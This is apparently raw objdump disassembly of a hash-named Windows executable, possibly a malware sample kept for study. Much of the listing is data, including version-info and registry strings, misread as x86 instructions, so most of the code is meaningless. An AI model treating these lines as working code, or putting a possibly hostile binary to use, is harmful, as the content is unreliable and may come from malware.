
692acd7aa54a1c159f7e09625bba47dfc6ce2ff6aeab9140550dc5a3b744a49d.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [eax],al
  401002:	add    BYTE PTR [eax],al
  401004:	mov    al,0x60
  401006:	inc    eax
  401007:	add    BYTE PTR [eax+0x1c],al
  40100a:	inc    eax
  40100b:	add    BYTE PTR [eax+0x1c],ah
  40100e:	inc    eax
  40100f:	add    BYTE PTR [eax+0x2000401c],dl
  401015:	sbb    al,0x40
	...
  40101f:	add    al,ah
  401021:	pop    edi
  401022:	inc    eax
  401023:	add    al,dh
  401025:	inc    ax
  401027:	add    BYTE PTR [eax],al
  401029:	add    BYTE PTR [eax],al
  40102b:	add    BYTE PTR [eax],ah
  40102d:	sbb    al,0x0
  40102f:	add    BYTE PTR [eax+0x1c],al
  401032:	add    BYTE PTR [eax],al
  401034:	pusha  
  401035:	sbb    al,0x0
  401037:	add    BYTE PTR [eax-0x2fffffe4],dl
  40103d:	sbb    al,0x0
  40103f:	add    al,dh
  401041:	sbb    eax,0x1ef00000
  401046:	add    BYTE PTR [eax],al
  401048:	mov    al,ds:0x5000001f
  40104d:	and    BYTE PTR [eax],al
  40104f:	add    BYTE PTR [eax+0x20],ah
  401052:	add    BYTE PTR [eax],al
  401054:	nop
  401055:	and    BYTE PTR [eax],al
  401057:	add    al,al
  401059:	and    BYTE PTR [eax],al
  40105b:	add    al,ah
  40105d:	and    BYTE PTR [eax],al
  40105f:	add    BYTE PTR [eax+0x21],ah
  401062:	add    BYTE PTR [eax],al
  401064:	and    BYTE PTR [edx],ah
  401066:	add    BYTE PTR [eax],al
  401068:	and    BYTE PTR [edx],0x0
  40106b:	add    BYTE PTR [eax-0x2fffffde],ah
  401071:	and    al,BYTE PTR [eax]
  401073:	add    al,al
  401075:	and    al,0x0
  401077:	add    al,ah
  401079:	and    al,0x0
  40107b:	add    BYTE PTR [eax+0x25],dh
  40107e:	add    BYTE PTR [eax],al
  401080:	loopne 0x4010a7
  401082:	add    BYTE PTR [eax],al
  401084:	jo     0x4010ac
  401086:	add    BYTE PTR [eax],al
  401088:	lock add BYTE PTR es:[eax],al
  40108c:	xor    BYTE PTR [edi],ah
  40108e:	add    BYTE PTR [eax],al
  401090:	jo     0x4010b9
  401092:	add    BYTE PTR [eax],al
  401094:	shl    BYTE PTR [edi],0x0
  401097:	add    al,dh
  401099:	daa    
  40109a:	add    BYTE PTR [eax],al
  40109c:	and    BYTE PTR [eax],ch
  40109e:	add    BYTE PTR [eax],al
  4010a0:	nop
  4010a1:	sub    BYTE PTR [eax],al
  4010a3:	add    BYTE PTR [eax-0x5fffffd5],dh
  4010a9:	xor    BYTE PTR [eax],al
  4010ab:	add    al,ah
  4010ad:	xor    DWORD PTR [eax],eax
  4010af:	add    BYTE PTR [eax],al
  4010b1:	xor    al,BYTE PTR [eax]
  4010b3:	add    BYTE PTR [eax],dl
  4010b5:	xor    al,BYTE PTR [eax]
  4010b7:	add    BYTE PTR [eax],ah
  4010b9:	xor    al,BYTE PTR [eax]
  4010bb:	add    al,ah
  4010bd:	xor    al,BYTE PTR [eax]
  4010bf:	add    al,al
  4010c1:	xor    al,0x0
  4010c3:	add    BYTE PTR [eax+0x4d],dh
  4010c6:	add    BYTE PTR [eax],al
  4010c8:	lock dec esi
  4010ca:	add    BYTE PTR [eax],al
  4010cc:	xor    BYTE PTR [edi+0x0],cl
  4010cf:	add    BYTE PTR [eax+0x52],al
  4010d2:	add    BYTE PTR [eax],al
  4010d4:	mov    al,ds:0x20000052
  4010d9:	push   ebx
  4010da:	add    BYTE PTR [eax],al
  4010dc:	xor    BYTE PTR [ebx+0x0],dl
  4010df:	add    al,ah
  4010e1:	pop    edi
  4010e2:	add    BYTE PTR [eax],al
  4010e4:	mov    al,0x60
  4010e6:	add    BYTE PTR [eax],al
  4010e8:	xor    BYTE PTR [ebx+0x0],ah
  4010eb:	add    BYTE PTR [eax+0x63],al
  4010ee:	add    BYTE PTR [eax],al
  4010f0:	jo     0x401155
  4010f2:	add    BYTE PTR [eax],al
  4010f4:	shl    BYTE PTR [ebp+0x0],0x0
  4010f8:	mov    al,ds:0xf0000066
  4010fd:	data16 add BYTE PTR [eax],al
  401100:	push   eax
  401101:	push   0x0
  401103:	add    BYTE PTR [eax+0x3000006a],al
  401109:	ins    BYTE PTR es:[edi],dx
  40110a:	add    BYTE PTR [eax],al
  40110c:	inc    eax
  40110d:	ins    BYTE PTR es:[edi],dx
  40110e:	add    BYTE PTR [eax],al
  401110:	pusha  
  401111:	ins    BYTE PTR es:[edi],dx
  401112:	add    BYTE PTR [eax],al
  401114:	sub    BYTE PTR [eax+eax*1+0x0],0x0
  401119:	add    BYTE PTR [eax],al
  40111b:	add    BYTE PTR [eax],al
  40111d:	add    BYTE PTR [eax],al
  40111f:	add    al,dl
  401121:	jo     0x401163
  401123:	add    BYTE PTR [eax],ah
  401125:	jno    0x401167
  401127:	add    BYTE PTR [ecx+0x6e],cl
  40112a:	jbe    0x40118d
  40112c:	ins    BYTE PTR es:[edi],dx
  40112d:	imul   esp,DWORD PTR [eax+eiz*1+0x70],0x6d617261
  401135:	gs je  0x40119d
  401138:	jb     0x40115a
  40113a:	jo     0x40119d
  40113c:	jae    0x4011b1
  40113e:	gs and BYTE PTR fs:[edi+ebp*2+0x20],dh
  401144:	inc    ebx
  401145:	and    BYTE PTR [edx+0x75],dh
  401148:	outs   dx,BYTE PTR ds:[esi]
  401149:	je     0x4011b4
  40114b:	ins    DWORD PTR es:[edi],dx
  40114c:	and    BYTE PTR gs:[esi+0x75],ah
  401150:	outs   dx,BYTE PTR ds:[esi]
  401151:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  401155:	outs   dx,BYTE PTR ds:[esi]
  401156:	or     al,BYTE PTR cs:[eax]
  401159:	add    BYTE PTR [eax],al
  40115b:	add    BYTE PTR [ebx+0x0],al
  40115e:	dec    esp
  40115f:	add    BYTE PTR [ebx+0x0],dl
  401162:	dec    ecx
  401163:	add    BYTE PTR [eax+eax*1+0x0],al
  401167:	add    BYTE PTR [ecx+0x0],al
  40116a:	jo     0x40116c
  40116c:	jo     0x40116e
  40116e:	dec    ecx
  40116f:	add    BYTE PTR [eax+eax*1+0x0],al
  401173:	add    BYTE PTR [ebx+0x0],dl
  401176:	add    BYTE PTR [eax],al
  401178:	dec    ebp
  401179:	add    BYTE PTR [eax],al
  40117b:	add    BYTE PTR [eax+eax*1+0x0],al
  40117f:	add    BYTE PTR [edx+0x0],al
  401182:	add    BYTE PTR [eax],al
  401184:	push   esi
  401185:	add    BYTE PTR [ecx+0x0],ah
  401188:	ins    BYTE PTR es:[edi],dx
  401189:	add    BYTE PTR [eax],al
  40118b:	add    BYTE PTR [esi+0x0],al
  40118e:	outs   dx,DWORD PTR ds:[esi]
  40118f:	add    BYTE PTR [edx+0x0],dh
  401192:	arpl   WORD PTR [eax],ax
  401194:	add    BYTE PTR gs:[edx+0x0],dl
  401198:	add    BYTE PTR gs:[ebp+0x0],ch
  40119c:	outs   dx,DWORD PTR ds:[esi]
  40119d:	add    BYTE PTR [esi+0x0],dh
  4011a0:	add    BYTE PTR gs:[eax],al
  4011a3:	add    BYTE PTR [esi+0x0],cl
  4011a6:	outs   dx,DWORD PTR ds:[esi]
  4011a7:	add    BYTE PTR [edx+0x0],dl
  4011aa:	add    BYTE PTR gs:[ebp+0x0],ch
  4011ae:	outs   dx,DWORD PTR ds:[esi]
  4011af:	add    BYTE PTR [esi+0x0],dh
  4011b2:	add    BYTE PTR gs:[eax],al
  4011b5:	add    BYTE PTR [eax],al
  4011b7:	add    BYTE PTR [eax+eax*1+0x65],al
  4011bb:	add    BYTE PTR [eax+eax*1+0x65],ch
  4011bf:	add    BYTE PTR [eax+eax*1+0x65],dh
  4011c3:	add    BYTE PTR [eax],al
  4011c5:	add    BYTE PTR [eax],al
  4011c7:	add    BYTE PTR [ebx+0x0],al
  4011ca:	outs   dx,DWORD PTR ds:[esi]
  4011cb:	add    BYTE PTR [ebp+0x0],ch
  4011ce:	jo     0x4011d0
  4011d0:	outs   dx,DWORD PTR ds:[esi]
  4011d1:	add    BYTE PTR [esi+0x0],ch
  4011d4:	add    BYTE PTR gs:[esi+0x0],ch
  4011d8:	je     0x4011da
  4011da:	and    BYTE PTR [eax],al
  4011dc:	inc    ebx
  4011dd:	add    BYTE PTR [ecx+0x0],ah
  4011e0:	je     0x4011e2
  4011e2:	add    BYTE PTR gs:[edi+0x0],ah
  4011e6:	outs   dx,DWORD PTR ds:[esi]
  4011e7:	add    BYTE PTR [edx+0x0],dh
  4011ea:	imul   eax,DWORD PTR [eax],0x730065
  4011f0:	add    BYTE PTR [eax],al
  4011f2:	add    BYTE PTR [eax],al
  4011f4:	inc    esi
  4011f5:	add    BYTE PTR [ecx+0x0],ch
  4011f8:	ins    BYTE PTR es:[edi],dx
  4011f9:	add    BYTE PTR [ebp+0x0],ah
  4011fc:	push   esp
  4011fd:	add    BYTE PTR [ecx+0x0],bh
  401200:	jo     0x401202
  401202:	add    BYTE PTR gs:[eax],al
  401205:	add    BYTE PTR [eax],al
  401207:	add    BYTE PTR [ecx+0x0],cl
  40120a:	outs   dx,BYTE PTR ds:[esi]
  40120b:	add    BYTE PTR [eax+eax*1+0x65],dh
  40120f:	add    BYTE PTR [edx+0x0],dh
  401212:	data16 add BYTE PTR [ecx+0x0],ah
  401216:	arpl   WORD PTR [eax],ax
  401218:	add    BYTE PTR gs:[eax],al
  40121b:	add    BYTE PTR [eax+0x0],cl
  40121e:	popa   
  40121f:	add    BYTE PTR [edx+0x0],dh
  401222:	add    BYTE PTR fs:[edi+0x0],dh
  401226:	popa   
  401227:	add    BYTE PTR [edx+0x0],dh
  40122a:	add    BYTE PTR gs:[eax],al
  40122d:	add    BYTE PTR [eax],al
  40122f:	add    BYTE PTR [ebp+0x0],cl
  401232:	imul   eax,DWORD PTR [eax],0x65006d
  401238:	add    BYTE PTR [eax],al
  40123a:	add    BYTE PTR [eax],al
  40123c:	push   ebx
  40123d:	add    BYTE PTR [ecx+0x0],al
  401240:	dec    ebp
  401241:	add    BYTE PTR [eax],al
  401243:	add    BYTE PTR [ebx+0x0],dl
  401246:	inc    ebp
  401247:	add    BYTE PTR [ebx+0x0],al
  40124a:	push   ebp
  40124b:	add    BYTE PTR [edx+0x0],dl
  40124e:	dec    ecx
  40124f:	add    BYTE PTR [eax+eax*1+0x59],dl
  401253:	add    BYTE PTR [eax],al
  401255:	add    BYTE PTR [eax],al
  401257:	add    BYTE PTR [ebx+0x0],dl
  40125a:	pop    ecx
  40125b:	add    BYTE PTR [ebx+0x0],dl
  40125e:	push   esp
  40125f:	add    BYTE PTR [ebp+0x0],al
  401262:	dec    ebp
  401263:	add    BYTE PTR [eax],al
  401265:	add    BYTE PTR [eax],al
  401267:	add    BYTE PTR [ebx+0x0],dl
  40126a:	outs   dx,DWORD PTR ds:[esi]
  40126b:	add    BYTE PTR [esi+0x0],ah
  40126e:	je     0x401270
  401270:	ja     0x401272
  401272:	popa   
  401273:	add    BYTE PTR [edx+0x0],dh
  401276:	add    BYTE PTR gs:[eax],al
  401279:	add    BYTE PTR [eax],al
  40127b:	add    BYTE PTR [eax+eax*1+0x79],dl
  40127f:	add    BYTE PTR [eax+0x0],dh
  401282:	add    BYTE PTR gs:[eax+eax*1+0x69],cl
  401287:	add    BYTE PTR [edx+0x0],ah
  40128a:	add    BYTE PTR [eax],al
  40128c:	and    eax,DWORD PTR [ebx]
  40128e:	add    BYTE PTR [eax],al
  401290:	add    BYTE PTR [eax],al
  401292:	add    BYTE PTR [eax],al
  401294:	rol    BYTE PTR [eax],0x0
  401297:	add    BYTE PTR [eax],al
  401299:	add    BYTE PTR [eax],al
  40129b:	inc    esi
  40129c:	push   0x5c004011
  4012a1:	adc    DWORD PTR [eax+0x0],eax
  4012a4:	enter  0x4011,0x0
  4012a8:	hlt    
  4012a9:	adc    DWORD PTR [eax+0x0],eax
  4012ac:	or     BYTE PTR [edx],dl
  4012ae:	inc    eax
  4012af:	add    BYTE PTR [edx+edx*1],bl
  4012b2:	inc    eax
  4012b3:	add    BYTE PTR [eax],dh
  4012b5:	adc    al,BYTE PTR [eax+0x0]
  4012b8:	cmp    al,0x12
  4012ba:	inc    eax
  4012bb:	add    BYTE PTR [edx+edx*1+0x40],al
  4012bf:	add    BYTE PTR [eax+0x12],bl
  4012c2:	inc    eax
  4012c3:	add    BYTE PTR [eax+0x12],ch
  4012c6:	inc    eax
  4012c7:	add    BYTE PTR [edx+edx*1+0x40],bh
  4012cb:	add    BYTE PTR [eax+0x27],dh
  4012ce:	inc    eax
  4012cf:	add    al,dh
  4012d1:	es inc eax
  4012d3:	add    BYTE PTR [eax],dh
  4012d5:	daa    
  4012d6:	inc    eax
  4012d7:	add    BYTE PTR [eax+0x20],ah
  4012da:	inc    eax
  4012db:	add    BYTE PTR [eax-0x3fffbfe0],dl
  4012e1:	and    BYTE PTR [eax+0x0],al
  4012e4:	loopne 0x401306
  4012e6:	inc    eax
  4012e7:	add    al,dh
  4012e9:	sbb    eax,0x1ef00040
  4012ee:	inc    eax
  4012ef:	add    BYTE PTR [eax+0x7000401f],ah
  4012f5:	es inc eax
  4012f7:	add    al,al
  4012f9:	and    al,0x40
  4012fb:	add    al,ah
  4012fd:	and    eax,0x27f00040
  401302:	inc    eax
  401303:	add    BYTE PTR [eax+0x25],dh
  401306:	inc    eax
  401307:	add    al,al
  401309:	and    al,0x40
  40130b:	add    al,ah
  40130d:	and    al,0x40
  40130f:	add    BYTE PTR [eax+0x20],ah
  401312:	inc    eax
  401313:	add    BYTE PTR [eax-0x3fffbfe0],dl
  401319:	and    BYTE PTR [eax+0x0],al
  40131c:	loopne 0x40133e
  40131e:	inc    eax
  40131f:	add    al,dh
  401321:	sbb    eax,0x1ef00040
  401326:	inc    eax
  401327:	add    BYTE PTR [eax-0x3fffbfe1],ah
  40132d:	daa    
  40132e:	inc    eax
  40132f:	add    al,dl
  401331:	and    al,BYTE PTR [eax+0x0]
  401334:	and    BYTE PTR [edx],0x40
  401337:	add    BYTE PTR [eax+0x20004022],ah
  40133d:	sub    BYTE PTR [eax+0x0],al
  401340:	nop
  401341:	sub    BYTE PTR [eax+0x0],al
  401344:	shl    BYTE PTR [ebp+0x40],0x0
  401348:	shl    BYTE PTR [ebp+0x40],0x0
  40134c:	shl    BYTE PTR [ebp+0x40],0x0
  401350:	and    BYTE PTR [eax],ch
  401352:	inc    eax
  401353:	add    BYTE PTR [eax-0x1fffbfd8],dl
  401359:	xor    DWORD PTR [eax+0x0],eax
  40135c:	add    BYTE PTR [edx],dh
  40135e:	inc    eax
  40135f:	add    BYTE PTR [eax],dl
  401361:	xor    al,BYTE PTR [eax+0x0]
  401364:	shl    BYTE PTR [eax+eax*2],0x0
  401368:	loopne 0x40139c
  40136a:	inc    eax
  40136b:	add    BYTE PTR [eax],ah
  40136d:	xor    al,BYTE PTR [eax+0x0]
  401370:	jo     0x4013bf
  401372:	inc    eax
  401373:	add    BYTE PTR [eax],dh
  401375:	push   ebx
  401376:	inc    eax
  401377:	add    al,dh
  401379:	dec    esi
  40137a:	inc    eax
  40137b:	add    BYTE PTR [eax],ah
  40137d:	push   ebx
  40137e:	inc    eax
  40137f:	add    BYTE PTR [eax+0x30004052],ah
  401385:	dec    edi
  401386:	inc    eax
  401387:	add    dh,dh
  401389:	inc    esi
  40138a:	pusha  
  40138b:	pop    edx
  40138c:	jns    0x401409
  40138e:	pop    ebx
  40138f:	inc    ebx
  401390:	nop
  401391:	mov    cs,WORD PTR [eiz*1-0x320570d1]
  401398:	inc    edx
  401399:	dec    esp
  40139a:	fstp   TBYTE PTR [ebp+ebx*4-0x30]
  40139e:	xor    al,BYTE PTR [ebp-0x51]
  4013a1:	popf   
  4013a2:	mov    ecx,0x3e2fdf41
  4013a7:	and    al,0x53
  4013a9:	add    BYTE PTR [edi+0x0],ch
  4013ac:	data16 add BYTE PTR [eax+eax*1+0x77],dh
  4013b1:	add    BYTE PTR [ecx+0x0],ah
  4013b4:	jb     0x4013b6
  4013b6:	add    BYTE PTR gs:[eax+eax*1+0x4d],bl
  4013bb:	add    BYTE PTR [ecx+0x0],ch
  4013be:	arpl   WORD PTR [eax],ax
  4013c0:	jb     0x4013c2
  4013c2:	outs   dx,DWORD PTR ds:[esi]
  4013c3:	add    BYTE PTR [ebx+0x0],dh
  4013c6:	outs   dx,DWORD PTR ds:[esi]
  4013c7:	add    BYTE PTR [esi+0x0],ah
  4013ca:	je     0x4013cc
  4013cc:	pop    esp
  4013cd:	add    BYTE PTR [ecx+0x0],al
  4013d0:	jbe    0x4013d2
  4013d2:	popa   
  4013d3:	add    BYTE PTR [eax+eax*1+0x6f],ch
  4013d7:	add    BYTE PTR [esi+0x0],ch
  4013da:	add    BYTE PTR cs:[edi+0x0],al
  4013de:	jb     0x4013e0
  4013e0:	popa   
  4013e1:	add    BYTE PTR [eax+0x0],dh
  4013e4:	push   0x63006900
  4013e9:	add    BYTE PTR [ebx+0x0],dh
  4013ec:	add    BYTE PTR [eax],al
  4013ee:	add    BYTE PTR [eax],al
  4013f0:	push   eax
  4013f1:	add    BYTE PTR [ecx+0x0],ch
  4013f4:	js     0x4013f6
  4013f6:	add    BYTE PTR gs:[eax+eax*1+0x53],ch
  4013fb:	add    BYTE PTR [eax+eax*1+0x72],dh
  4013ff:	add    BYTE PTR [ebp+0x0],dh
  401402:	arpl   WORD PTR [eax],ax
  401404:	je     0x401406
  401406:	jne    0x401408
  401408:	jb     0x40140a
  40140a:	add    BYTE PTR gs:[eax],al
  40140d:	add    BYTE PTR [eax],al
  40140f:	add    BYTE PTR [edi+0x0],al
  401412:	popa   
  401413:	add    BYTE PTR [ebp+0x0],ch
  401416:	ins    DWORD PTR es:[edi],dx
  401417:	add    BYTE PTR [ecx+0x0],ah
  40141a:	dec    esp
  40141b:	add    BYTE PTR [ebp+0x0],ah
  40141e:	jbe    0x401420
  401420:	add    BYTE PTR gs:[eax+eax*1+0x0],ch
  401425:	add    BYTE PTR [eax],al
  401427:	add    BYTE PTR [ecx],al
  401429:	add    BYTE PTR [eax],al
  40142b:	add    BYTE PTR [eax],al
  40142d:	add    BYTE PTR [eax],al
  40142f:	add    al,al
  401431:	add    BYTE PTR [eax],al
  401433:	add    BYTE PTR [eax],al
  401435:	add    BYTE PTR [eax],al
  401437:	inc    esi
  401438:	sub    BYTE PTR [eax+eax*2],dl
  40143b:	add    BYTE PTR [eax],al
  40143d:	add    BYTE PTR [eax],al
  40143f:	add    BYTE PTR [ecx],al
	...
  40144d:	add    BYTE PTR [eax],al
  40144f:	add    BYTE PTR [edx],dl
  401451:	add    al,0x2
  401453:	add    BYTE PTR [eax],al
  401455:	add    BYTE PTR [eax],al
  401457:	add    al,al
  401459:	add    BYTE PTR [eax],al
  40145b:	add    BYTE PTR [eax],al
  40145d:	add    BYTE PTR [eax],al
  40145f:	inc    esi
  401460:	add    DWORD PTR [edx+eax*1],eax
  401463:	add    BYTE PTR [eax],al
  401465:	add    BYTE PTR [eax],al
  401467:	add    al,al
  401469:	add    BYTE PTR [eax],al
  40146b:	add    BYTE PTR [eax],al
  40146d:	add    BYTE PTR [eax],al
  40146f:	inc    esi
  401470:	std    
  401471:	push   ss
  401472:	mov    edx,0xfb77d932
  401477:	dec    edx
  401478:	pushf  
  401479:	lahf   
  40147a:	jo     0x4014ba
  40147c:	xchg   edx,eax
  40147d:	lods   eax,DWORD PTR ds:[esi]
  40147e:	dec    ebx
  40147f:	push   DWORD PTR [esp+edx*1+0x40]
  401486:	add    BYTE PTR [eax],al
  401488:	add    DWORD PTR [eax],eax
  40148a:	add    BYTE PTR [eax],al
  40148c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40148d:	adc    al,0x40
  40148f:	add    BYTE PTR [eax],al
  401491:	add    BYTE PTR [eax],al
  401493:	add    BYTE PTR [ecx],al
	...
  4014a5:	add    al,0x2
  4014a7:	add    BYTE PTR [eax],al
  4014a9:	add    BYTE PTR [eax],al
  4014ab:	add    al,al
  4014ad:	add    BYTE PTR [eax],al
  4014af:	add    BYTE PTR [eax],al
  4014b1:	add    BYTE PTR [eax],al
  4014b3:	inc    esi
  4014b4:	test   BYTE PTR [esi+0x60],0x5a
  4014b8:	jns    0x401535
  4014ba:	pop    ebx
  4014bb:	inc    ebx
  4014bc:	nop
  4014bd:	mov    cs,WORD PTR [eiz*1-0x320570d1]
	...
  4014cc:	rol    BYTE PTR [eax],0x0
  4014cf:	add    BYTE PTR [eax],al
  4014d1:	add    BYTE PTR [eax],al
  4014d3:	inc    esi
  4014d4:	dec    ebp
  4014d5:	add    BYTE PTR [edi+0x0],ch
  4014d8:	add    BYTE PTR fs:[ebp+0x0],dh
  4014dc:	ins    BYTE PTR es:[edi],dx
  4014dd:	add    BYTE PTR [ebp+0x0],ah
  4014e0:	add    BYTE PTR [eax],al
  4014e2:	add    BYTE PTR [eax],al
  4014e4:	dec    ebp
  4014e5:	add    BYTE PTR [edi+0x0],ch
  4014e8:	add    BYTE PTR fs:[ebp+0x0],dh
  4014ec:	ins    BYTE PTR es:[edi],dx
  4014ed:	add    BYTE PTR [ebp+0x0],ah
  4014f0:	pop    edi
  4014f1:	add    BYTE PTR [edx+0x0],dl
  4014f4:	popa   
  4014f5:	add    BYTE PTR [edi+0x0],dh
  4014f8:	add    BYTE PTR [eax],al
  4014fa:	add    BYTE PTR [eax],al
  4014fc:	push   edx
  4014fd:	add    BYTE PTR [ebp+0x0],al
  401500:	inc    edi
  401501:	add    BYTE PTR [ecx+0x0],cl
  401504:	push   ebx
  401505:	add    BYTE PTR [eax+eax*1+0x52],dl
  401509:	add    BYTE PTR [ecx+0x0],bl
  40150c:	add    BYTE PTR [eax],al
  40150e:	add    BYTE PTR [eax],al
  401510:	dec    eax
  401511:	add    BYTE PTR [ebx+0x0],cl
  401514:	inc    ebx
  401515:	add    BYTE PTR [edx+0x0],dl
  401518:	add    BYTE PTR [eax],al
  40151a:	add    BYTE PTR [eax],al
  40151c:	dec    eax
  40151d:	add    BYTE PTR [ebx+0x0],cl
  401520:	inc    ebx
  401521:	add    BYTE PTR [ebp+0x0],dl
  401524:	add    BYTE PTR [eax],al
  401526:	add    BYTE PTR [eax],al
  401528:	dec    eax
  401529:	add    BYTE PTR [ebx+0x0],cl
  40152c:	dec    esp
  40152d:	add    BYTE PTR [ebp+0x0],cl
  401530:	add    BYTE PTR [eax],al
  401532:	add    BYTE PTR [eax],al
  401534:	dec    eax
  401535:	add    BYTE PTR [ebx+0x0],cl
  401538:	push   ebp
  401539:	add    BYTE PTR [eax],al
  40153b:	add    BYTE PTR [eax+0x0],cl
  40153e:	dec    ebx
  40153f:	add    BYTE PTR [eax+0x0],dl
  401542:	inc    esp
  401543:	add    BYTE PTR [eax],al
  401545:	add    BYTE PTR [eax],al
  401547:	add    BYTE PTR [eax+0x0],cl
  40154a:	dec    ebx
  40154b:	add    BYTE PTR [eax+eax*1+0x44],al
  40154f:	add    BYTE PTR [eax],al
  401551:	add    BYTE PTR [eax],al
  401553:	add    BYTE PTR [eax+0x0],cl
  401556:	dec    ebx
  401557:	add    BYTE PTR [ebx+0x0],al
  40155a:	inc    ebx
  40155b:	add    BYTE PTR [eax],al
  40155d:	add    BYTE PTR [eax],al
  40155f:	add    BYTE PTR [eax+0x0],cl
  401562:	dec    ebx
  401563:	add    BYTE PTR [ebp+0x0],al
  401566:	pop    ecx
  401567:	add    BYTE PTR [edi+0x0],bl
  40156a:	inc    ebx
  40156b:	add    BYTE PTR [eax+eax*1+0x41],cl
  40156f:	add    BYTE PTR [ebx+0x0],dl
  401572:	push   ebx
  401573:	add    BYTE PTR [ebp+0x0],al
  401576:	push   ebx
  401577:	add    BYTE PTR [edi+0x0],bl
  40157a:	push   edx
  40157b:	add    BYTE PTR [edi+0x0],cl
  40157e:	dec    edi
  40157f:	add    BYTE PTR [eax+eax*1+0x0],dl
  401583:	add    BYTE PTR [eax+0x0],cl
  401586:	dec    ebx
  401587:	add    BYTE PTR [ebp+0x0],al
  40158a:	pop    ecx
  40158b:	add    BYTE PTR [edi+0x0],bl
  40158e:	inc    ebx
  40158f:	add    BYTE PTR [ebp+0x0],dl
  401592:	push   edx
  401593:	add    BYTE PTR [edx+0x0],dl
  401596:	inc    ebp
  401597:	add    BYTE PTR [esi+0x0],cl
  40159a:	push   esp
  40159b:	add    BYTE PTR [edi+0x0],bl
  40159e:	push   ebp
  40159f:	add    BYTE PTR [ebx+0x0],dl
  4015a2:	inc    ebp
  4015a3:	add    BYTE PTR [edx+0x0],dl
  4015a6:	add    BYTE PTR [eax],al
  4015a8:	dec    eax
  4015a9:	add    BYTE PTR [ebx+0x0],cl
  4015ac:	inc    ebp
  4015ad:	add    BYTE PTR [ecx+0x0],bl
  4015b0:	pop    edi
  4015b1:	add    BYTE PTR [eax+eax*1+0x4f],cl
  4015b5:	add    BYTE PTR [ebx+0x0],al
  4015b8:	inc    ecx
  4015b9:	add    BYTE PTR [eax+eax*1+0x5f],cl
  4015bd:	add    BYTE PTR [ebp+0x0],cl
  4015c0:	inc    ecx
  4015c1:	add    BYTE PTR [ebx+0x0],al
  4015c4:	dec    eax
  4015c5:	add    BYTE PTR [ecx+0x0],cl
  4015c8:	dec    esi
  4015c9:	add    BYTE PTR [ebp+0x0],al
  4015cc:	add    BYTE PTR [eax],al
  4015ce:	add    BYTE PTR [eax],al
  4015d0:	dec    eax
  4015d1:	add    BYTE PTR [ebx+0x0],cl
  4015d4:	inc    ebp
  4015d5:	add    BYTE PTR [ecx+0x0],bl
  4015d8:	pop    edi
  4015d9:	add    BYTE PTR [ebp+0x0],dl
  4015dc:	push   ebx
  4015dd:	add    BYTE PTR [ebp+0x0],al
  4015e0:	push   edx
  4015e1:	add    BYTE PTR [ebx+0x0],dl
  4015e4:	add    BYTE PTR [eax],al
  4015e6:	add    BYTE PTR [eax],al
  4015e8:	dec    eax
  4015e9:	add    BYTE PTR [ebx+0x0],cl
  4015ec:	inc    ebp
  4015ed:	add    BYTE PTR [ecx+0x0],bl
  4015f0:	pop    edi
  4015f1:	add    BYTE PTR [eax+0x0],dl
  4015f4:	inc    ebp
  4015f5:	add    BYTE PTR [edx+0x0],dl
  4015f8:	inc    esi
  4015f9:	add    BYTE PTR [edi+0x0],cl
  4015fc:	push   edx
  4015fd:	add    BYTE PTR [ebp+0x0],cl
  401600:	inc    ecx
  401601:	add    BYTE PTR [esi+0x0],cl
  401604:	inc    ebx
  401605:	add    BYTE PTR [ebp+0x0],al
  401608:	pop    edi
  401609:	add    BYTE PTR [eax+eax*1+0x41],al
  40160d:	add    BYTE PTR [eax+eax*1+0x41],dl
  401611:	add    BYTE PTR [eax],al
  401613:	add    BYTE PTR [eax+0x0],cl
  401616:	dec    ebx
  401617:	add    BYTE PTR [ebp+0x0],al
  40161a:	pop    ecx
  40161b:	add    BYTE PTR [edi+0x0],bl
  40161e:	inc    esp
  40161f:	add    BYTE PTR [ecx+0x0],bl
  401622:	dec    esi
  401623:	add    BYTE PTR [edi+0x0],bl
  401626:	inc    esp
  401627:	add    BYTE PTR [ecx+0x0],al
  40162a:	push   esp
  40162b:	add    BYTE PTR [ecx+0x0],al
  40162e:	add    BYTE PTR [eax],al
  401630:	dec    eax
  401631:	add    BYTE PTR [ebx+0x0],cl
  401634:	inc    ebp
  401635:	add    BYTE PTR [ecx+0x0],bl
  401638:	pop    edi
  401639:	add    BYTE PTR [ebx+0x0],al
  40163c:	push   ebp
  40163d:	add    BYTE PTR [edx+0x0],dl
  401640:	push   edx
  401641:	add    BYTE PTR [ebp+0x0],al
  401644:	dec    esi
  401645:	add    BYTE PTR [eax+eax*1+0x5f],dl
  401649:	add    BYTE PTR [ebx+0x0],al
  40164c:	dec    edi
  40164d:	add    BYTE PTR [esi+0x0],cl
  401650:	inc    esi
  401651:	add    BYTE PTR [ecx+0x0],cl
  401654:	inc    edi
  401655:	add    BYTE PTR [eax],al
  401657:	add    BYTE PTR [eax],dl
  401659:	adc    eax,0x40
  40165e:	add    BYTE PTR [eax+0x40151c],al
  401664:	add    DWORD PTR [eax],eax
  401666:	add    BYTE PTR [eax+0x401528],al
  40166c:	add    al,BYTE PTR [eax]
  40166e:	add    BYTE PTR [eax+0x401534],al
  401674:	add    eax,DWORD PTR [eax]
  401676:	add    BYTE PTR [eax+0x40153c],al
  40167c:	add    al,0x0
  40167e:	add    BYTE PTR [eax+0x401548],al
  401684:	push   es
  401685:	add    BYTE PTR [eax],al
  401687:	adc    BYTE PTR [ebp+edx*1+0x40],0x0
  40168c:	add    eax,0x60800000
  401691:	adc    eax,0x40
  401696:	add    BYTE PTR [eax+0x401584],al
  40169c:	add    DWORD PTR [eax],eax
  40169e:	add    BYTE PTR [eax+0x4015a8],al
  4016a4:	add    al,BYTE PTR [eax]
  4016a6:	add    BYTE PTR [eax+0x4015d0],al
  4016ac:	add    eax,DWORD PTR [eax]
  4016ae:	add    BYTE PTR [eax+0x4015e8],al
  4016b4:	add    al,0x0
  4016b6:	add    BYTE PTR [eax+0x401614],al
  4016bc:	push   es
  4016bd:	add    BYTE PTR [eax],al
  4016bf:	xor    BYTE PTR [eax],0x16
  4016c2:	inc    eax
  4016c3:	add    BYTE PTR ds:0x41800000,al
  4016c9:	add    BYTE PTR [eax+0x0],dl
  4016cc:	dec    ecx
  4016cd:	add    BYTE PTR ds:0x53004d00,ch
  4016d3:	add    BYTE PTR ds:0x69005700,ch
  4016d9:	add    BYTE PTR [esi+0x0],ch
  4016dc:	sub    eax,0x6f004300
  4016e1:	add    BYTE PTR [edx+0x0],dh
